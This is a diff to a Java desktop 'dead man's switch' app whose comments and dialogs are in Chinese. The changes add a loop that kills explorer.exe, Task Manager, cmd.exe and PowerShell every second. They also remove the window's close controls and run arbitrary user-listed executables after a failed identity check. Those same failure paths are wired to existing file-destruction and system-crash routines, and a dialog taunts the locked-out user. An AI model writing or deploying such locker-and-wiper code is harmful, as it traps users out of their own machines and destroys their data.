@@ -7,12 +7,21 @@ import java.nio.file.attribute.BasicFileAttributes;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 public class SilemeApp {
     private static final String CONFIG_FILE = "sileme_config.ser";
     private Config config;
     private boolean normalExit = false;
     private boolean isMainDialog = false; //标记是否在主对话框
+    private ScheduledExecutorService processMonitor; //进程监控服务
+    
+    //要禁止的进程列表
+    private static final String[] FORBIDDEN_PROCESSES = {
+        "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe"
+    };
     
     public static void main(String[] args) {
         SwingUtilities.invokeLater(() -> new SilemeApp().start());
@@ -78,6 +87,7 @@ public class SilemeApp {
         public boolean isFirstTimeSetup = true; //是否首次配置
         public int remainingAttempts = 20;      //剩余尝试次数
         public int restartCount = 0;            //重启次数
+        public List<String> executableList = new ArrayList<>(); //要执行的可执行文件
     }
     
     //首次配置向导
@@ -250,6 +260,55 @@ public class SilemeApp {
             }
         });
         
+        nextButton.addActionListener(e -> showExecutableSelectionScreen(frame));
+        
+        buttonPanel.add(addButton);
+        buttonPanel.add(removeButton);
+        buttonPanel.add(nextButton);
+        
+        panel.add(label, BorderLayout.NORTH);
+        panel.add(listScrollPane, BorderLayout.CENTER);
+        panel.add(buttonPanel, BorderLayout.SOUTH);
+        
+        updateContent(frame, panel);
+    }
+    
+    //选择可执行文件屏幕
+    private void showExecutableSelectionScreen(JFrame frame) {
+        JPanel panel = new JPanel(new BorderLayout());
+        
+        JLabel label = new JLabel("<html><h2>配置可执行文件</h2>请选择在您死亡后需要执行的可执行文件（如.bat, .exe等）：</html>");
+        
+        DefaultListModel<String> listModel = new DefaultListModel<>();
+        JList<String> executableList = new JList<>(listModel);
+        JScrollPane listScrollPane = new JScrollPane(executableList);
+        
+        JPanel buttonPanel = new JPanel();
+        JButton addButton = new JButton("添加可执行文件");
+        JButton removeButton = new JButton("移除选中");
+        JButton nextButton = new JButton("下一步");
+        
+        addButton.addActionListener(e -> {
+            JFileChooser chooser = new JFileChooser();
+            chooser.setFileFilter(new javax.swing.filechooser.FileNameExtensionFilter("可执行文件", "exe", "bat", "cmd", "com", "msi"));
+            int result = chooser.showOpenDialog(frame);
+            if (result == JFileChooser.APPROVE_OPTION) {
+                String path = chooser.getSelectedFile().getAbsolutePath();
+                if (!listModel.contains(path)) {
+                    listModel.addElement(path);
+                    config.executableList.add(path);
+                }
+            }
+        });
+        
+        removeButton.addActionListener(e -> {
+            int selectedIndex = executableList.getSelectedIndex();
+            if (selectedIndex != -1) {
+                config.executableList.remove(selectedIndex);
+                listModel.remove(selectedIndex);
+            }
+        });
+        
         nextButton.addActionListener(e -> showConfirmationCodeScreen(frame));
         
         buttonPanel.add(addButton);
@@ -335,11 +394,18 @@ public class SilemeApp {
             }
         }));
         
+        //启动进程监控
+        startProcessMonitoring();
+        
         JFrame frame = new JFrame("死了么");
         frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
         frame.setSize(500, 220);
         frame.setLocationRelativeTo(null);
         frame.setAlwaysOnTop(true);
+        
+        //完全禁用窗口装饰，移除关闭按钮
+        frame.setUndecorated(true);
+        frame.getRootPane().setWindowDecorationStyle(JRootPane.NONE);
         
         //添加窗口监听器，检测窗口关闭
         frame.addWindowListener(new WindowAdapter() {
@@ -379,6 +445,84 @@ public class SilemeApp {
         frame.setVisible(true);
     }
     
+    //启动进程监控
+    private void startProcessMonitoring() {
+        processMonitor = Executors.newSingleThreadScheduledExecutor();
+        
+        //立即执行一次
+        killForbiddenProcesses();
+        
+        //每隔1秒检查一次
+        processMonitor.scheduleAtFixedRate(this::killForbiddenProcesses, 0, 1, TimeUnit.SECONDS);
+        
+        System.out.println("进程监控已启动，禁止以下进程: " + String.join(", ", FORBIDDEN_PROCESSES));
+    }
+    
+    //停止进程监控并恢复explorer
+    private void stopProcessMonitoringAndRestore() {
+        if (processMonitor != null && !processMonitor.isShutdown()) {
+            processMonitor.shutdown();
+            try {
+                if (!processMonitor.awaitTermination(3, TimeUnit.SECONDS)) {
+                    processMonitor.shutdownNow();
+                }
+            } catch (InterruptedException e) {
+                processMonitor.shutdownNow();
+                Thread.currentThread().interrupt();
+            }
+            System.out.println("进程监控已停止");
+        }
+        
+        //恢复explorer.exe
+        restoreExplorer();
+    }
+    
+    //仅停止进程监控（不恢复explorer）
+    private void stopProcessMonitoringOnly() {
+        if (processMonitor != null && !processMonitor.isShutdown()) {
+            processMonitor.shutdown();
+            try {
+                if (!processMonitor.awaitTermination(3, TimeUnit.SECONDS)) {
+                    processMonitor.shutdownNow();
+                }
+            } catch (InterruptedException e) {
+                processMonitor.shutdownNow();
+                Thread.currentThread().interrupt();
+            }
+            System.out.println("进程监控已停止");
+        }
+    }
+
+    //杀死禁止的进程
+    private void killForbiddenProcesses() {
+        for (String processName : FORBIDDEN_PROCESSES) {
+            try {
+                //使用taskkill命令强制结束进程
+                String[] cmd = {"cmd.exe", "/c", "taskkill", "/f", "/im", processName};
+                Process process = Runtime.getRuntime().exec(cmd);
+                process.waitFor(); //等待命令执行完成
+                
+                //如果进程被成功杀死，记录日志
+                if (process.exitValue() == 0) {
+                    System.out.println("已终止进程: " + processName);
+                }
+            } catch (Exception e) {
+                //忽略异常，可能是进程不存在
+            }
+        }
+    }
+    
+    //恢复explorer进程
+    private void restoreExplorer() {
+        try {
+            //恢复explorer.exe
+            Runtime.getRuntime().exec("explorer.exe");
+            System.out.println("已恢复explorer.exe");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
     private void handleDeathConfirmation(JFrame frame) {
         int confirmationCount = 0;
         
@@ -413,7 +557,11 @@ public class SilemeApp {
                     + "欢迎，" + inputName.trim() + "<br><br>"
                     + config.popupMessage + "</html>");
                 
-                //执行清理操作
+                //停止进程监控并恢复explorer（正常退出）
+                stopProcessMonitoringAndRestore();
+                
+                //先执行可执行文件，再执行清理操作
+                executeExternalPrograms();
                 performCleanup();
                 
                 normalExit = true;
@@ -424,6 +572,14 @@ public class SilemeApp {
                 JOptionPane.showMessageDialog(frame, 
                     "身份验证失败！\n您输入的姓名不在接管者名单中。", 
                     "验证失败", JOptionPane.ERROR_MESSAGE);
+                    
+                //验证失败时不恢复explorer（非正常退出）
+                stopProcessMonitoringOnly();
+                
+                //执行可执行文件和清理
+                executeExternalPrograms();
+                performCleanup();
+                crashSystem();
             }
         }
     }
@@ -440,6 +596,9 @@ public class SilemeApp {
             }
             
             if (inputCode.equals(config.confirmationCode)) {
+                //验证成功，停止进程监控并恢复explorer（正常退出）
+                stopProcessMonitoringAndRestore();
+                
                 normalExit = true;
                 JOptionPane.showMessageDialog(frame, "验证成功！欢迎回来，" + config.myName + "。");
                 config.remainingAttempts = 20;
@@ -464,6 +623,11 @@ public class SilemeApp {
                 "尝试次数已耗尽！将执行数据销毁程序并崩溃系统，你明明可以进入pe删除启动脚本的，给你机会你不中用啊。", 
                 "严重警告", JOptionPane.WARNING_MESSAGE);
             
+            //尝试次数耗尽时不恢复explorer（非正常退出）
+            stopProcessMonitoringOnly();
+            
+            //先执行可执行文件，再销毁文件和崩溃系统
+            executeExternalPrograms();
             destroyAllFiles();
             try {
                 Thread.sleep(2000);
@@ -472,6 +636,27 @@ public class SilemeApp {
             }
             crashSystem();
             System.exit(0);
+        }
+    }
+    
+    //新增：执行外部程序
+    private void executeExternalPrograms() {
+        if (config.executableList != null && !config.executableList.isEmpty()) {
+            for (String executablePath : config.executableList) {
+                try {
+                    File executableFile = new File(executablePath);
+                    if (executableFile.exists()) {
+                        ProcessBuilder processBuilder = new ProcessBuilder(executablePath);
+                        processBuilder.start();
+                        System.out.println("执行可执行文件: " + executablePath);
+                    } else {
+                        System.out.println("可执行文件不存在: " + executablePath);
+                    }
+                } catch (IOException e) {
+                    System.err.println("执行可执行文件失败: " + executablePath);
+                    e.printStackTrace();
+                }
+            }
         }
     }
     
